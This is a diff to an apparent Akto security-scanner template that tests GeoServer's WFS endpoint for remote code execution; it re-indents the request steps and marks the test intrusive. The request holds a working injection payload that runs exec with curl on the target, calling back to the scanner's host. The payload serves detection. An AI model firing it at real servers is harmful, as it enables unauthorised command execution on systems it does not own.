@@ -2,7 +2,7 @@ id: GEOSERVER_RCE
 info:
   name: "GeoServer Library Remote Code Execution Test"
   description: "The GeoServer Library Remote Code Execution (RCE) Test checks for vulnerabilities in the GeoServer software that could allow an attacker to execute arbitrary code remotely. This type of vulnerability may arise from insecure handling of user inputs or exploitable flaws in the server’s libraries or third-party components. If successfully exploited, an attacker could gain control over the GeoServer instance, potentially affecting the underlying system and accessing sensitive geospatial data. Regular security updates, proper input validation, and secure configuration are critical to mitigating this risk."
-  details:  "The GeoServer Library Remote Code Execution (RCE) Test aims to identify vulnerabilities within GeoServer that could allow an attacker to exploit insecure libraries or components used by the software. Such vulnerabilities often arise when the server processes untrusted input, such as geospatial data or configuration files, without adequate validation or sanitization. An attacker could craft a malicious request that triggers remote code execution, potentially compromising the server and its data. Ensuring that all libraries are up to date, input is properly sanitized, and security best practices are followed can help prevent such exploits."
+  details: "The GeoServer Library Remote Code Execution (RCE) Test aims to identify vulnerabilities within GeoServer that could allow an attacker to exploit insecure libraries or components used by the software. Such vulnerabilities often arise when the server processes untrusted input, such as geospatial data or configuration files, without adequate validation or sanitization. An attacker could craft a malicious request that triggers remote code execution, potentially compromising the server and its data. Ensuring that all libraries are up to date, input is properly sanitized, and security best practices are followed can help prevent such exploits."
   impact: "The impact of a GeoServer Library Remote Code Execution (RCE) vulnerability is severe, as it could allow an attacker to execute arbitrary code on the server, gaining full control over the system. This could lead to the compromise of sensitive geospatial data, unauthorized access to the server, and potential disruption of services. The attacker might also exploit the server to pivot further into the network, escalating the attack. To mitigate this, it’s crucial to ensure secure configurations, timely patching, and proper input validation within the GeoServer instance."
   category:
     name: COMMAND_INJECTION
@@ -17,6 +17,8 @@ info:
   cve:
     - CVE-2020-9484
 
+settings:
+  nature: INTRUSIVE
 api_selection_filters:
   method:
     neq: "OPTIONS"
@@ -31,11 +33,11 @@ execute:
   type: single
   requests:
     - req:
-      - send_ssrf_req:
-          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
-      - modify_url: "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=abcdef&valueReference=exec(java.lang.Runtime.getRuntime(),'curl+https://test-services.akto.io/${random_uuid}')"
-      - modify_method: GET
-      - replace_body: '{}'
+        - send_ssrf_req:
+            url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+        - modify_url: "/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=abcdef&valueReference=exec(java.lang.Runtime.getRuntime(),'curl+https://test-services.akto.io/${random_uuid}')"
+        - modify_method: GET
+        - replace_body: '{}'
 validate:
   ssrf_url_hit: ${random_uuid}
   response_headers:
